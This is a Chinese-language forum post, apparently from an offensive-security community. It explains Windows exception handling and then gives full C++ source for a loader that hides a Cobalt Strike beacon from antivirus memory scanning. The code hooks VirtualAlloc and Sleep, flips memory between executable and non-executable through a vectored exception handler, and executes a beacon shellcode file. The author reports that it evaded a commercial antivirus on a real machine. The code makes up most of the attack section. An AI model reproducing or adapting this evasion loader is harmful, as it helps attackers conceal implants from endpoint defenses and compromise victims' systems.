windows异常处理
-----------

Windows中主要的异常处理机制：VEH、SEH、C++EH。

SEH中文全称：结构化异常处理。就是平时用的`__try` `__finally` `__try` `__except`,是对c的扩展。

VEH中文全称：向量异常处理。一般来说用`AddVectoredExceptionHandler`去添加一个异常处理函数，可以通过第一个参数决定是否将VEH函数插入到VEH链表头，插入到链表头的函数先执行，如果为1，则会最优先执行。

C++EH是C++提供的异常处理方式，执行顺序将排在最后。

在用户模式下发生异常时，异常处理分发函数在内部会先调用遍历 VEH 记录链表的函数， 如果没有找到可以处理异常的注册函数，再开始遍历 SEH 注册链表。

Windows异常处理顺序流程

- 终止当前程序的执行
- 调试器(进程必须被调试,向调试器发送EXCEPTION\_DEBUG\_EVENT消息)
- 执行VEH
- 执行SEH
- TopLevelEH(进程被调试时不会被执行)
- 执行VEH
- 交给调试器(上面的异常处理都说处理不了，就再次交给调试器)
- 调用异常端口通知csrss.exe

通过流程也可以看到VEH的执行顺序是要优于SEH的。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6a3efe8ca8bb758974908b7406aa4d8107bf429a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6a3efe8ca8bb758974908b7406aa4d8107bf429a.png)

通过VEH异常处理规避内存扫描
---------------

当AV描扫进程空间的时候，并不会将所有的内存空间都扫描一遍，只会扫描敏感的内存区域。

所谓的敏感内存区域无非就是指可执行的区域。思路就是不断地改变某一块内存属性，当应该执行命令或者某些操作的时候，执行的内存属性是可执行的，当功能模块进入睡眠的时候则将内存属性改为不可执行。

当执行的地址空间为不可执行时，若强行执行则会返回0xc0000005异常，这个异常是指没有权限执行。所以通过VEH抓取这个异常，即可根据需求，动态的改变内存属性，进而逃避内存扫描。

当触发0xc0000005异常的时候需要恢复内存可执行属性，就通过AddVectoredExceptionHandler去注册一个异常处理函数，作用就是更改内存属性为可执行。那么就需要知道是哪一块地址需要修改，这里要根据申请空间API决定，如果是VirtualAlloc就hook VirtualAlloc，如果是其他申请空间API就hook其他API，这个根据具体的c2profile配置有关。如果不使用c2profile那么默认就是使用VirtualAlloc分配空间。这里先看一下hook VirtualAlloc，作用主要是为了读取起始地址和大小。

```c++
static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;

LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    unhookVirtualAlloc();
    Beacon_len = dwSize;
    Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    hookVirtualAlloc();
    printf("分配大小:%d", Beacon_len);
    printf("分配地址:%x \n", Beacon_address);
    return Beacon_address;
}

void hookVirtualAlloc() {
    DWORD dwAllocOldProtect = NULL;
    BYTE pAllocData[5] = { 0xe9,0x0,0x0,0x0,0x0 };
    //保存原来的硬编码
    RtlCopyMemory(g_OldAlloc, OldVirtualAlloc, sizeof(pAllocData));
    //计算偏移
    DWORD dwAllocOffeset = (DWORD)NewVirtualAlloc - (DWORD)OldVirtualAlloc - 5;
    //得到完整的pAllocData
    RtlCopyMemory(&pAllocData[1], &dwAllocOffeset, sizeof(dwAllocOffeset));
    //改为可写属性
    VirtualProtect(OldVirtualAlloc, 5, PAGE_READWRITE, &dwAllocOldProtect);
    //将偏移地址写入，跳转到新的
    RtlCopyMemory(OldVirtualAlloc, pAllocData, sizeof(pAllocData));
    //还原属性
    VirtualProtect(OldVirtualAlloc, 5, dwAllocOldProtect, &dwAllocOldProtect);
}

void unhookVirtualAlloc() {
    DWORD dwOldProtect = NULL;
    VirtualProtect(OldVirtualAlloc, 5, PAGE_READWRITE, &dwOldProtect);
    //还原硬编码
    RtlCopyMemory(OldVirtualAlloc, g_OldAlloc, sizeof(g_OldAlloc));
    //还原属性
    VirtualProtect(OldVirtualAlloc, 5, dwOldProtect, &dwOldProtect);
}
```

还有一个需要去hook的就是Sleep，因为需要在执行Sleep的时候就将功能模块的内存属性改为不可执行，规避内存扫描。

```c++
static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;

void WINAPI NewSleep(DWORD dwMilliseconds) {
    if (Vir_FLAG)
    {
        VirtualFree(shellcode_addr, 0, MEM_RELEASE);
        Vir_FLAG = false;
    }
    printf("sleep时间:%d\n", dwMilliseconds);
    unhookSleep();
    OldSleep(dwMilliseconds);
    hookSleep();
    //解锁
    SetEvent(hEvent);
}

void hookSleep() {
    DWORD dwSleepOldProtect = NULL;
    BYTE pSleepData[5] = { 0xe9,0x0,0x0,0x0,0x0 };
    //保存原来的硬编码
    RtlCopyMemory(g_OldSleep, OldSleep, sizeof(pSleepData));
    //计算偏移
    DWORD dwSleepOffeset = (DWORD)NewSleep - (DWORD)OldSleep - 5;
    //得到完整的pAllocData
    RtlCopyMemory(&pSleepData[1], &dwSleepOffeset, sizeof(dwSleepOffeset));
    //改为可写属性
    VirtualProtect(OldSleep, 5, PAGE_EXECUTE_READWRITE, &dwSleepOldProtect);
    //将偏移地址写入，跳转到新的
    RtlCopyMemory(OldSleep, pSleepData, sizeof(pSleepData));
    //还原属性
    VirtualProtect(OldSleep, 5, dwSleepOldProtect, &dwSleepOldProtect);
}

void unhookSleep() {
    DWORD dwOldProtect = NULL;
    VirtualProtect(OldSleep, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    //还原硬编码
    RtlCopyMemory(OldSleep, g_OldSleep, sizeof(g_OldSleep));
    //还原属性
    VirtualProtect(OldSleep, 5, dwOldProtect, &dwOldProtect);
}
```

然后就是注册异常函数，这个异常函数就是为了恢复可执行内存属性。

is\_Exception函数就是为了验证是不是在申请空间内的范围呢出现异常，而不是其他内存空间。

```c++
LONG NTAPI PvectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo){
    printf("异常错误码:%x\n", ExceptionInfo->ExceptionRecord->ExceptionCode);
    printf("线程地址:%lx\n", ExceptionInfo->ContextRecord->Eip);
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(ExceptionInfo->ContextRecord->Eip) {
        printf("恢复可执行内存属性");
        VirtualProtect(Beacon_address, Beacon_len, PAGE_EXECUTE_READWRITE, &Beacon_flOldProtect);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

起一个线程，让他不断地去等待Sleep函数通知，通知后就将内存空间重新设置为不可执行。线程控制的话就用到了事件。

```c++
DWORD WINAPI SetNoExecutable(LPVOID lpParameter) {
    while (true)
    {
        //等待解锁
        WaitForSingleObject(hEvent, INFINITE);
        printf("设置Beacon内存属性不可执行\n");
        VirtualProtect(Beacon_address, Beacon_len, PAGE_READWRITE, &Beacon_flOldProtect);
        //设置事件为未被通知的，重新上锁
        ResetEvent(hEvent);
    }
}

int main()
{
    //设置事件为有信号的，处于通知状态。
    hEvent = CreateEvent(NULL,TRUE,false,NULL);
    AddVectoredExceptionHandler(1, &PvectoredExceptionHandler);
    hookVirtualAlloc();
    hookSleep();

    unsigned char* BinData = NULL;
    size_t size = 0;
    char* szFilePath = (char*)"Beacon32.bin";
    BinData = ReadBinaryFile(szFilePath, &size);
    shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    memcpy(shellcode_addr, BinData, size);
    VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_flOldProtect);
    HANDLE hThread1 = CreateThread(NULL, 0, SetNoExecutable, NULL, 0, NULL);
    CloseHandle(hThread1);
    (*(int(*)()) shellcode_addr)();

}
```

这里有一个很混淆的地方：hook VirtualAlloc并不是去hook的上面这个我们自己调用的VirtualAlloc，这个是没有意义的。hook的是cs真正功能代码模块，他自己分配的内存地址才是真正的beacon代码地址，这里用下LN师傅的图。图中是stager分阶段的执行过程，如果是stagerless无阶段的执行过程也是差不多的，只不过没有远程去请求而是直接写在文件里。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-57cd31c4929b4abf1d20c09f28caf9fd14845324.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-57cd31c4929b4abf1d20c09f28caf9fd14845324.png)

比如生成一个无阶段的raw文件，然后跑一下

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6287905cbf3cd39965bf41181a15ac4f02916f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6287905cbf3cd39965bf41181a15ac4f02916f2.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-697cc35977b2313fff8ea4503550c1976dbf27a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-697cc35977b2313fff8ea4503550c1976dbf27a4.png)

会发现这里调用了两次VirtualAlloc，实际上就是分配给真正的beacon功能代码，这个地址才是真正的beacon代码实现功能的地址，我们要改的内存属性其实在这里。

还可以看到他cs是执行完一段代码，就释放一段空间。

执行前：

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-40f180a29f9ec766774a5ef1d97f9a80f3f3118a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-40f180a29f9ec766774a5ef1d97f9a80f3f3118a.png)

执行后：

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-91b349976d14ea491098780288b58a3c5b07826d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-91b349976d14ea491098780288b58a3c5b07826d.png)

他把之前部分内存已经free掉了。

最后，找了个同学的物理机数字杀软去看了下，上线是完全没有问题的。(cs上线的图当时忘了截，基础命令可以执行)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-931bba476e4750eb76b609bf5bcd2d8d9351a1ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-931bba476e4750eb76b609bf5bcd2d8d9351a1ce.png)

这里是实际环境下的数字杀软，并不是虚拟机版本，杀毒力度是很强的，即便他认为内存空间没有问题，但是当我执行敏感操作，比如远程创建线程，他还是会直接弹出警告。所以即便已经把对抗做到内存，但是还是处处受限，上线只是一方面，能执行各种操作是另一方面，像LN前辈说的一样，可能只有加白才是最后对抗的归宿。

写在最后
----

这个思路是学习@WBGlIl师傅的思路，在今年5月份的时候读到了他的文章，  
但是当时看不懂，基础知识比较薄弱。现在有了些基础知识后就想着尝试去理解大佬的思路。文章中如果有说错了地方也请师傅们指出。